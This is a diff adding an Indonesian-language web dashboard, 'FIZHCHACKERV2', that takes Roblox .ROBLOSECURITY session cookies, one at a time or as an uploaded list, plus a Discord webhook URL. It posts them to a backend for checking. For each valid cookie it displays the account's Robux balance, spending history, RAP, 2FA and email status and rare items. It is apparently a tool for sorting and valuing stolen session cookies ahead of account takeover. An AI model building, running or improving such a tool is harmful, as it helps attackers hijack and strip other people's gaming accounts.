@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIZHCHACKERV2 - Pro Roblox Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-[#0b0e14] text-[#d1d5db] font-sans antialiased min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div class="w-full max-w-xl space-y-6">
+        
+        <!-- Panel Kontrol Input -->
+        <div class="bg-[#12161f] border border-[#212631] rounded-xl p-5 shadow-2xl">
+            <div class="flex justify-between items-center mb-4">
+                <h1 class="text-sm font-bold text-white flex items-center gap-2">
+                    <i class="fa-solid fa-shield-halved text-indigo-500"></i> FIZHCHACKERV2 Dashboard
+                </h1>
+                <span class="bg-indigo-600/20 text-indigo-400 border border-indigo-500/30 text-[10px] px-2 py-0.5 rounded-full font-semibold">Live API 👾👑</span>
+            </div>
+
+            <!-- Tab Mode Selector -->
+            <div class="grid grid-cols-2 gap-2 mb-4 bg-[#080a0f] p-1 rounded-lg border border-[#212631]">
+                <button type="button" id="tabSingle" onclick="switchMode('single')" class="py-2 text-xs font-bold rounded-md bg-indigo-600 text-white transition shadow">Single Check</button>
+                <button type="button" id="tabBulk" onclick="switchMode('bulk')" class="py-2 text-xs font-bold rounded-md text-gray-400 hover:text-white transition">Bulk Document</button>
+            </div>
+
+            <form id="checkerForm" class="space-y-3">
+                <input type="hidden" id="modeInput" value="single">
+
+                <div>
+                    <label class="block text-[11px] font-medium text-gray-400 mb-1">Discord Webhook URL:</label>
+                    <input type="url" id="webhookInput" required class="w-full bg-[#080a0f] border border-[#212631] rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500 font-mono" placeholder="https://discord.com/api/webhooks/...">
+                </div>
+
+                <div id="singleSection">
+                    <label class="block text-[11px] font-medium text-gray-400 mb-1">.ROBLOSECURITY Cookie:</label>
+                    <textarea id="cookieInput" rows="2" class="w-full bg-[#080a0f] border border-[#212631] rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500 font-mono" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
+                </div>
+
+                <div id="bulkSection" class="hidden space-y-2">
+                    <label class="block text-[11px] font-medium text-gray-400 mb-1">Upload Dokumen Cookie (.txt):</label>
+                    <input type="file" id="fileInput" accept=".txt" class="w-full bg-[#080a0f] border border-[#212631] rounded-lg p-2 text-xs text-gray-300 file:mr-4 file:py-1.5 file:px-3 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500 cursor-pointer">
+                </div>
+
+                <button type="submit" id="submitBtn" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-2 rounded-lg text-xs transition duration-200 shadow-lg mt-2">
+                    Jalankan FIZHCHACKERV2 Scan 🚀
+                </button>
+            </form>
+        </div>
+
+        <!-- Result Card Container -->
+        <div id="resultOutput" class="space-y-4">
+            <div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 text-center text-xs text-gray-500 font-mono">
+                > Menunggu eksekusi FIZHCHACKERV2...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function switchMode(mode) {
+            const modeInput = document.getElementById('modeInput');
+            const tabSingle = document.getElementById('tabSingle');
+            const tabBulk = document.getElementById('tabBulk');
+            const singleSec = document.getElementById('singleSection');
+            const bulkSec = document.getElementById('bulkSection');
+
+            modeInput.value = mode;
+            if(mode === 'single') {
+                tabSingle.className = "py-2 text-xs font-bold rounded-md bg-indigo-600 text-white transition shadow";
+                tabBulk.className = "py-2 text-xs font-bold rounded-md text-gray-400 hover:text-white transition";
+                singleSec.classList.remove('hidden');
+                bulkSec.classList.add('hidden');
+            } else {
+                tabBulk.className = "py-2 text-xs font-bold rounded-md bg-indigo-600 text-white transition shadow";
+                tabSingle.className = "py-2 text-xs font-bold rounded-md text-gray-400 hover:text-white transition";
+                bulkSec.classList.remove('hidden');
+                singleSec.classList.add('hidden');
+            }
+        }
+
+        document.getElementById('checkerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const mode = document.getElementById('modeInput').value;
+            const webhookUrl = document.getElementById('webhookInput').value.trim();
+            const outBox = document.getElementById('resultOutput');
+            const btn = document.getElementById('submitBtn');
+
+            const formData = new FormData();
+            formData.append('webhook_url', webhookUrl);
+            formData.append('mode', mode);
+
+            if(mode === 'single') {
+                const cookieVal = document.getElementById('cookieInput').value.trim();
+                if(!cookieVal) {
+                    alert("Cookie tidak boleh kosong!");
+                    return;
+                }
+                formData.append('cookie', cookieVal);
+            } else {
+                const fileField = document.getElementById('fileInput');
+                if(fileField.files.length === 0) {
+                    alert("Pilih dokumen teks (.txt) terlebih dahulu!");
+                    return;
+                }
+                formData.append('file', fileField.files[0]);
+            }
+
+            btn.innerText = "Memproses API Roblox...";
+            btn.disabled = true;
+            outBox.innerHTML = `<div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 text-center text-xs text-indigo-400 font-mono">> Menghubungkan ke API Asli Roblox (${mode.toUpperCase()})...</div>`;
+
+            try {
+                const response = await fetch('/api/check', { method: 'POST', body: formData });
+                const result = await response.json();
+
+                if(response.ok) {
+                    outBox.innerHTML = "";
+                    result.results.forEach((r, index) => {
+                        if(r.status === 'valid') {
+                            let spentHTML = r.spent_history && r.spent_history.length > 0 ? r.spent_history.map(g => `
+                                <div class="flex items-center justify-between bg-[#080a0f] border border-[#212631] p-2 rounded-lg">
+                                    <div class="flex items-center gap-3">
+                                        <img src="${g.icon}" class="w-8 h-8 rounded-md object-cover border border-gray-700" alt="Icon">
+                                        <div>
+                                            <div class="text-white text-xs font-medium">${g.name}</div>
+                                            <div class="text-[10px] text-gray-500">Spent record</div>
+                                        </div>
+                                    </div>
+                                    <span class="text-red-400 font-bold text-xs">-${g.spent} R$</span>
+                                </div>
+                            `).join('') : '<div class="text-xs text-gray-500">Tidak ada riwayat pengeluaran game.</div>';
+
+                            let recentHTML = r.recent_games && r.recent_games.length > 0 ? r.recent_games.map(g => `
+                                <div class="flex items-center justify-between bg-[#080a0f] border border-[#212631] p-2 rounded-lg">
+                                    <div class="flex items-center gap-3">
+                                        <img src="${g.icon}" class="w-8 h-8 rounded-md object-cover border border-gray-700" alt="Icon">
+                                        <div>
+                                            <div class="text-white text-xs font-medium">${g.name}</div>
+                                            <div class="text-[10px] text-gray-500">Recently played</div>
+                                        </div>
+                                    </div>
+                                    <span class="text-indigo-400 font-bold text-xs"><i class="fa-solid fa-gamepad"></i></span>
+                                </div>
+                            `).join('') : '<div class="text-xs text-gray-500">Tidak ada riwayat map dimainkan.</div>';
+
+                            let animsHTML = r.animations && r.animations.length > 0 ? r.animations.map(anim => `
+                                <div class="bg-[#080a0f] border border-[#212631] rounded-lg p-2 text-center flex flex-col items-center">
+                                    <img src="${anim.icon}" class="w-10 h-10 rounded-md object-cover border border-gray-800 mb-1" alt="Anim">
+                                    <span class="text-[10px] text-gray-300 truncate w-full">${anim.name}</span>
+                                </div>
+                            `).join('') : '<div class="text-xs text-gray-500">Tidak ada animasi terdeteksi.</div>';
+
+                            outBox.innerHTML += `
+                                <div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 shadow-2xl space-y-4 mb-4">
+                                    <!-- Header Info & Foto Avatar Roblox -->
+                                    <div class="flex items-center gap-4 bg-[#080a0f] border border-[#212631] p-3 rounded-lg">
+                                        <img src="${r.avatar_url}" class="w-14 h-14 rounded-lg object-cover border border-indigo-500/30 bg-black" alt="Avatar">
+                                        <div>
+                                            <div class="text-white font-bold text-sm">[${index+1}] ${r.username}</div>
+                                            <div class="text-[11px] text-gray-500 font-mono">ID: #${r.id}</div>
+                                            <div class="text-[10px] text-indigo-400 mt-0.5"><i class="fa-solid fa-circle-check"></i> Avatar Render Loaded</div>
+                                        </div>
+                                    </div>
+
+                                    <div class="grid grid-cols-3 gap-2 text-center">
+                                        <div class="bg-[#080a0f] border border-[#212631] p-2 rounded-lg">
+                                            <div class="text-[9px] text-gray-500 uppercase">Robux Saldo</div>
+                                            <div class="text-xs font-bold text-white mt-0.5">${r.robux}</div>
+                                        </div>
+                                        <div class="bg-[#080a0f] border border-[#212631] p-2 rounded-lg">
+                                            <div class="text-[9px] text-gray-500 uppercase">Total Purchases</div>
+                                            <div class="text-xs font-bold text-emerald-400 mt-0.5">+${r.total_purchased}</div>
+                                        </div>
+                                        <div class="bg-[#080a0f] border border-[#212631] p-2 rounded-lg">
+                                            <div class="text-[9px] text-gray-500 uppercase">Total Spent</div>
+                                            <div class="text-xs font-bold text-red-400 mt-0.5">-${r.total_spent}</div>
+                                        </div>
+                                    </div>
+
+                                    <div class="bg-[#080a0f] border border-[#212631] rounded-lg p-3 text-xs space-y-1.5">
+                                        <div class="text-gray-400 font-semibold mb-1">Account & Security Status:</div>
+                                        <div class="text-white">• 📅 Account Age: <b>${r.created_at} (${r.account_age_days} Days)</b></div>
+                                        <div class="text-white">• 📧 Email Status: <b>${r.email_status}</b></div>
+                                        <div class="text-white">• 🔒 2FA / A2F Status: <b>${r.a2f_status ? '✅ Active' : '❌ Inactive'}</b></div>
+                                        <div class="text-white">• 💀 Korblox: <b>${r.korblox ? '✅ Yes' : '❌ No'}</b> | Headless: <b>${r.headless ? '✅ Yes' : '❌ No'}</b></div>
+                                        <div class="text-white">• 📊 RAP Total: <b>${r.rap} R$</b></div>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <div class="text-[11px] text-gray-400 font-semibold uppercase tracking-wider">Total Spent Per Game (Pengeluaran)</div>
+                                        <div class="space-y-1.5">${spentHTML}</div>
+                                    </div>
+
+                                    <div class="space-y-2">
+                                        <div class="text-[11px] text-gray-400 font-semibold uppercase tracking-wider">Recently Played Games (Map Dimainkan)</div>
+                                        <div class="space-y-1.5">${recentHTML}</div>
+                                    </div>
+
+                                    <div class="space-y-2 pt-2">
+                                        <div class="text-[11px] text-gray-400 font-semibold uppercase tracking-wider">Avatar Animations (API Asset Icons)</div>
+                                        <div class="grid grid-cols-2 gap-2">${animsHTML}</div>
+                                    </div>
+                                </div>
+                            `;
+                        } else {
+                            outBox.innerHTML += `<div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 text-center text-xs text-red-400 font-mono mb-2">> [${index+1}] Cookie Invalid</div>`;
+                        }
+                    });
+                } else {
+                    outBox.innerHTML = `<div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 text-center text-xs text-red-400 font-mono">> [ERROR] ${result.message}</div>`;
+                }
+            } catch (err) {
+                outBox.innerHTML = `<div class="bg-[#12161f] border border-[#212631] rounded-xl p-4 text-center text-xs text-red-400 font-mono">> [ERROR] Gagal memproses permintaan.</div>`;
+            } finally {
+                btn.innerText = "Jalankan FIZHCHACKERV2 Scan 🚀";
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
